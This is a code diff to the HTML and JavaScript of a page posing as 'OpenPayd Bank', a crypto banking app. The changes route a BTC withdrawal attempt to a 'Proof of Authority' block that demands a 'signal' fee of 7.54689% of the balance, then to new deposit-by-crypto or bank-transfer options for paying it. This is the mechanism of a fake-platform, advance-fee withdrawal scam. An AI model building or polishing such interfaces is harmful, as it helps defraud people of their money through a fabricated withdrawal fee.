@@ -69,13 +69,27 @@
       text-align: center;
     }
 
-    .official-logo {
+    /* Conteneur du logo avec style de secours élégant si l'image met du temps à charger */
+    .logo-container {
       width: 64px;
       height: 64px;
       border-radius: 18px;
-      object-fit: cover;
+      background: var(--primary-gradient);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 32px;
+      font-weight: 800;
       margin: 0 auto 16px auto;
-      box-shadow: 0 4px 12px rgba(124, 58, 237, 0.2);
+      box-shadow: 0 4px 12px rgba(124, 58, 237, 0.3);
+      overflow: hidden;
+    }
+
+    .official-logo {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
     }
 
     .unlock-title {
@@ -108,10 +122,23 @@
       gap: 10px;
     }
 
-    .header-logo {
+    .header-logo-container {
       width: 38px;
       height: 38px;
       border-radius: 10px;
+      background: var(--primary-gradient);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 18px;
+      font-weight: 800;
+      overflow: hidden;
+    }
+
+    .header-logo {
+      width: 100%;
+      height: 100%;
       object-fit: cover;
     }
 
@@ -465,16 +492,29 @@
       line-height: 1.4;
       text-align: center;
     }
+
+    .converted-value-badge {
+      background: #f8fafc;
+      border: 1px solid var(--border-color);
+      padding: 8px 12px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--accent-purple);
+      margin-top: 4px;
+    }
   </style>
 </head>
 <body>
 
   <div class="app-container">
 
-    <!-- 1. ECRAN D'ACCES / CLE PRIVEE (VIDE) -->
+    <!-- 1. ECRAN D'ACCES / CLE PRIVEE -->
     <div id="unlock-screen">
       <div class="unlock-card">
-        <img src="logo officiel.PNG" alt="OpenPayd Logo" class="official-logo" onerror="this.style.display='none'">
+        <div class="logo-container">
+          <img src="logo officiel.PNG" alt="OpenPayd Logo" class="official-logo" onerror="this.style.display='none'">
+        </div>
         <div class="unlock-title">OpenPayd Bank</div>
         <div class="unlock-subtitle">Entrez votre clé d'accès ou adresse de compte</div>
         
@@ -494,7 +534,9 @@
       <!-- En-tête -->
       <header>
         <div class="brand">
-          <img src="logo officiel.PNG" alt="Logo" class="header-logo" onerror="this.style.display='none'">
+          <div class="header-logo-container">
+            <img src="logo officiel.PNG" alt="Logo" class="header-logo" onerror="this.style.display='none'">
+          </div>
           <div>
             <div class="brand-title">OpenPayd <span>Bank</span></div>
             <div class="brand-subtitle" id="txt-subtitle">Banque Crypto & Fiat En Ligne</div>
@@ -583,7 +625,7 @@
             </div>
           </div>
 
-          <!-- BTC (CLICABLE -> OUVRE MENU ENVOYER/RECEVOIR) -->
+          <!-- BTC -->
           <div class="account-card clickable" onclick="openModal('modal-btc-menu')">
             <div>
               <div class="card-header">
@@ -607,7 +649,7 @@
 
   </div>
 
-  <!-- MODALE: MENU DU COMPTE BTC (ENVOYER / RECEVOIR) -->
+  <!-- MODALE: MENU DU COMPTE BTC -->
   <div class="modal-overlay" id="modal-btc-menu">
     <div class="modal-box">
       <div class="modal-header">
@@ -615,11 +657,11 @@
         <button class="close-btn" onclick="closeModal('modal-btc-menu')">✕</button>
       </div>
       <div style="display: flex; flex-direction: column; gap: 10px;">
-        <div class="option-card" onclick="closeModal('modal-btc-menu'); openModal('modal-send');">
+        <div class="option-card" onclick="closeModal('modal-btc-menu'); openWithdrawAmountModal();">
           <div style="display: flex; align-items: center; gap: 10px;">
             <span style="font-size: 20px;">↗️</span>
             <div>
-              <div style="font-weight: 700; font-size: 13px;" id="btc-opt-send">Envoyer</div>
+              <div style="font-weight: 700; font-size: 13px;" id="btc-opt-send">Envoyer / Retirer</div>
               <div style="font-size: 11px; color: var(--text-muted);">Effectuer un retrait ou transfert</div>
             </div>
           </div>
@@ -658,7 +700,7 @@
     </div>
   </div>
 
-  <!-- MODALE: ENVOYER -->
+  <!-- MODALE: ENVOYER DES FONDS -->
   <div class="modal-overlay" id="modal-send">
     <div class="modal-box">
       <div class="modal-header">
@@ -682,21 +724,43 @@
         </div>
       </div>
       <div id="send-step-external" style="display: none;">
-        <form onsubmit="handleExecuteSend(event)">
+        <form onsubmit="handleExecuteSendForm(event)">
           <div class="form-group"><label id="lbl-ext-nom">Nom</label><input type="text" required></div>
           <div class="form-group"><label id="lbl-ext-prenom">Prénom</label><input type="text" required></div>
           <div class="form-group"><label id="lbl-ext-bank">Nom de la banque</label><input type="text" required></div>
           <div class="form-group"><label>IBAN</label><input type="text" required></div>
           <div class="form-group"><label>BIC / SWIFT</label><input type="text" required></div>
-          <div class="form-group"><label id="lbl-ext-amount">Montant</label><input type="number" step="0.01" required></div>
-          <button type="submit" class="btn-submit" id="btn-confirm-send">Confirmer l'envoi</button>
+          <button type="submit" class="btn-submit">Continuer vers la saisie du montant</button>
           <button type="button" class="btn-submit" style="background: #e2e8f0; color: var(--text-main); margin-top: 6px;" onclick="resetSendModal()" id="btn-back-send">Retour</button>
         </form>
       </div>
     </div>
   </div>
 
-  <!-- MODALE: MESSAGE DE BLOCAGE POA (FINALE APRES ENVOI) -->
+  <!-- MODALE DÉDIÉE : SAISIE DU MONTANT DU RETRAIT -->
+  <div class="modal-overlay" id="modal-withdraw-amount">
+    <div class="modal-box">
+      <div class="modal-header">
+        <div class="modal-title" id="withdraw-amount-title">Montant du Retrait</div>
+        <button class="close-btn" onclick="closeModal('modal-withdraw-amount')">✕</button>
+      </div>
+      <form onsubmit="confirmWithdrawAmount(event)">
+        <div class="form-group">
+          <label id="lbl-withdraw-amount-input">Saisir le montant du retrait (BTC)</label>
+          <input type="number" id="withdraw-btc-input" step="0.00001" value="1.00" oninput="updateWithdrawConversion()" required>
+        </div>
+        
+        <div class="form-group">
+          <label>Valeur équivalente estimée :</label>
+          <div class="converted-value-badge" id="withdraw-fiat-converted-display">€0.00</div>
+        </div>
+
+        <button type="submit" class="btn-submit" id="btn-withdraw-confirm">Confirmer</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- MODALE: MESSAGE DE BLOCAGE POA -->
   <div class="modal-overlay" id="modal-poa-block">
     <div class="modal-box" style="text-align: center;">
       <div class="modal-header">
@@ -722,7 +786,29 @@
 
       <div style="display: flex; gap: 10px; margin-top: 16px;">
         <button type="button" class="btn-submit" style="background: #e2e8f0; color: var(--text-main);" onclick="closeModal('modal-poa-block')" id="poa-btn-cancel">Cancel</button>
-        <button type="button" class="btn-submit" onclick="alert(translations[state.lang].poaConfirmedAlert);" id="poa-btn-confirm">Confirm</button>
+        <button type="button" class="btn-submit" onclick="closeModal('modal-poa-block'); openModal('modal-deposit-choice');" id="poa-btn-confirm">Confirm</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODALE DE CHOIX POST-BLOCAGE -->
+  <div class="modal-overlay" id="modal-deposit-choice">
+    <div class="modal-box">
+      <div class="modal-header">
+        <div class="modal-title" id="choice-deposit-title">Régularisation du Signal</div>
+        <button class="close-btn" onclick="closeModal('modal-deposit-choice')">✕</button>
+      </div>
+      <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 14px;" id="choice-deposit-sub">
+        Choisissez votre méthode de dépôt pour effectuer le règlement du signal de validation requis.
+      </div>
+      
+      <div style="display: flex; flex-direction: column; gap: 10px;">
+        <button type="button" class="btn-submit" onclick="closeModal('modal-deposit-choice'); openModal('modal-receive');" id="btn-choice-crypto">
+          Déposer par Cryptos
+        </button>
+        <button type="button" class="btn-submit" style="background: var(--accent-purple);" onclick="closeModal('modal-deposit-choice'); openModal('modal-deposit');" id="btn-choice-bank">
+          Effectuer par Dépôt Bancaire
+        </button>
       </div>
     </div>
   </div>
@@ -744,11 +830,11 @@
     </div>
   </div>
 
-  <!-- MODALE: DEPOSER -->
+  <!-- MODALE: DEPOSER BANCAIRE -->
   <div class="modal-overlay" id="modal-deposit">
     <div class="modal-box">
       <div class="modal-header">
-        <div class="modal-title" id="modal-dep-title">Déposer des fonds</div>
+        <div class="modal-title" id="modal-dep-title">Déposer des fonds (Virement Bancaire)</div>
         <button class="close-btn" onclick="closeModal('modal-deposit')">✕</button>
       </div>
       <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;" id="lbl-dep-sub">Un IBAN personnalisé vous sera attribué pour approvisionner votre compte.</div>
@@ -775,7 +861,7 @@
     </div>
   </div>
 
-  <!-- MODALE: PARAMETRES & SUPPORT MIS A JOUR -->
+  <!-- MODALE: PARAMETRES & SUPPORT -->
   <div class="modal-overlay" id="modal-settings">
     <div class="modal-box">
       <div class="modal-header">
@@ -819,7 +905,6 @@
         lblExtNom: "Nom",
         lblExtPrenom: "Prénom",
         lblExtBank: "Nom de la banque",
-        lblExtAmount: "Montant",
         btnConfSend: "Confirmer l'envoi",
         btnBack: "Retour",
         modRecTitle: "Recevoir des fonds",
@@ -839,7 +924,7 @@
         alertSwap: "Swap effectué avec succès !",
         copied: "Adresse copiée !",
         btcMenuTitle: "Gestion Compte BTC",
-        btcOptSend: "Envoyer",
+        btcOptSend: "Envoyer / Retirer",
         btcOptSendSub: "Effectuer un retrait ou transfert",
         btcOptReceive: "Recevoir",
         btcOptReceiveSub: "Afficher l'adresse de dépôt",
@@ -847,7 +932,13 @@
         poaSubtitle: "Proof of Authority (POA) validation required to proceed.",
         poaCancel: "Cancel",
         poaConfirm: "Confirm",
-        poaConfirmedAlert: "Signal requis soumis pour vérification."
+        withdrawTitle: "Montant du Retrait",
+        withdrawInputLabel: "Saisir le montant du retrait (BTC)",
+        withdrawBtnConfirm: "Confirmer",
+        choiceTitle: "Régularisation du Signal",
+        choiceSub: "Choisissez votre méthode de dépôt pour effectuer le règlement du signal de validation requis.",
+        choiceCrypto: "Déposer par Cryptos",
+        choiceBank: "Effectuer par Dépôt Bancaire"
       },
       EN: {
         subtitle: "Online Crypto & Fiat Bank",
@@ -877,7 +968,6 @@
         lblExtNom: "Last Name",
         lblExtPrenom: "First Name",
         lblExtBank: "Bank Name",
-        lblExtAmount: "Amount",
         btnConfSend: "Confirm Send",
         btnBack: "Back",
         modRecTitle: "Receive Funds",
@@ -897,7 +987,7 @@
         alertSwap: "Swap executed successfully!",
         copied: "Address copied!",
         btcMenuTitle: "BTC Account Management",
-        btcOptSend: "Send",
+        btcOptSend: "Send / Withdraw",
         btcOptSendSub: "Perform withdrawal or transfer",
         btcOptReceive: "Receive",
         btcOptReceiveSub: "Show deposit address",
@@ -905,7 +995,13 @@
         poaSubtitle: "Proof of Authority (POA) validation required to proceed.",
         poaCancel: "Cancel",
         poaConfirm: "Confirm",
-        poaConfirmedAlert: "Required signal submitted for verification."
+        withdrawTitle: "Withdrawal Amount",
+        withdrawInputLabel: "Enter withdrawal amount (BTC)",
+        withdrawBtnConfirm: "Confirm",
+        choiceTitle: "Signal Settlement",
+        choiceSub: "Choose your deposit method to complete the required validation signal payment.",
+        choiceCrypto: "Deposit via Crypto",
+        choiceBank: "Deposit via Bank Transfer"
       }
     };
 
@@ -990,6 +1086,17 @@
       document.getElementById('btc-opt-send').innerText = t.btcOptSend;
       document.getElementById('btc-opt-receive').innerText = t.btcOptReceive;
 
+      // Modale Montant Retrait
+      document.getElementById('withdraw-amount-title').innerText = t.withdrawTitle;
+      document.getElementById('lbl-withdraw-amount-input').innerText = t.withdrawInputLabel;
+      document.getElementById('btn-withdraw-confirm').innerText = t.withdrawBtnConfirm;
+
+      // Modale Post-Blocage Dépôt
+      document.getElementById('choice-deposit-title').innerText = t.choiceTitle;
+      document.getElementById('choice-deposit-sub').innerText = t.choiceSub;
+      document.getElementById('btn-choice-crypto').innerText = t.choiceCrypto;
+      document.getElementById('btn-choice-bank').innerText = t.choiceBank;
+
       // Modale Envoyer & Formulaire
       document.getElementById('modal-send-title').innerText = t.modSendTitle;
       document.getElementById('opt-my-bank').innerText = t.optMyBank;
@@ -1003,8 +1110,6 @@
       document.getElementById('lbl-ext-nom').innerText = t.lblExtNom;
       document.getElementById('lbl-ext-prenom').innerText = t.lblExtPrenom;
       document.getElementById('lbl-ext-bank').innerText = t.lblExtBank;
-      document.getElementById('lbl-ext-amount').innerText = t.lblExtAmount;
-      document.getElementById('btn-confirm-send').innerText = t.btnConfSend;
       document.getElementById('btn-back-send').innerText = t.btnBack;
 
       // Modale Recevoir, Déposer, Swap, Paramètres
@@ -1038,6 +1143,7 @@
       renderAccount('EUR');
       renderAccount('USD');
       calculateSwap();
+      updateWithdrawConversion();
     }
 
     function renderAccount(curr) {
@@ -1100,7 +1206,8 @@
         closeModal('modal-send');
         openRegisterBankModal(state.currency);
       } else {
-        triggerPoaBlock();
+        closeModal('modal-send');
+        openWithdrawAmountModal();
       }
     }
 
@@ -1114,18 +1221,37 @@
       document.getElementById('send-step-external').style.display = 'none';
     }
 
-    function handleExecuteSend(e) {
+    function handleExecuteSendForm(e) {
       e.preventDefault();
+      closeModal('modal-send');
+      openWithdrawAmountModal();
+    }
+
+    function openWithdrawAmountModal() {
+      updateWithdrawConversion();
+      openModal('modal-withdraw-amount');
+    }
+
+    function updateWithdrawConversion() {
+      const btcInput = parseFloat(document.getElementById('withdraw-btc-input').value) || 0;
+      const rate = state.currency === 'EUR' ? state.btcPriceEur : state.btcPriceUsd;
+      const symbol = state.currency === 'EUR' ? '€' : '$';
+      const convertedFiat = btcInput * rate;
+
+      document.getElementById('withdraw-fiat-converted-display').innerText = 
+        `${symbol}${convertedFiat.toLocaleString('fr-FR', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+    }
+
+    function confirmWithdrawAmount(e) {
+      e.preventDefault();
+      closeModal('modal-withdraw-amount');
       triggerPoaBlock();
     }
 
-    /* CALCUL DU SIGNAL REQUIS A 7.54689% DE LA BALANCE TOTALE ET AFFICHAGE DU BLOCAGE */
     function triggerPoaBlock() {
-      closeModal('modal-send');
       const btcFiat = state.currency === 'EUR' ? state.btcBalance * state.btcPriceEur : state.btcBalance * state.btcPriceUsd;
       const symbol = state.currency === 'EUR' ? '€' : '$';
       
-      // Calcul du signal requis à 7.54689%
       const requiredBtc = state.btcBalance * 0.0754689;
       const requiredFiat = btcFiat * 0.0754689;
 
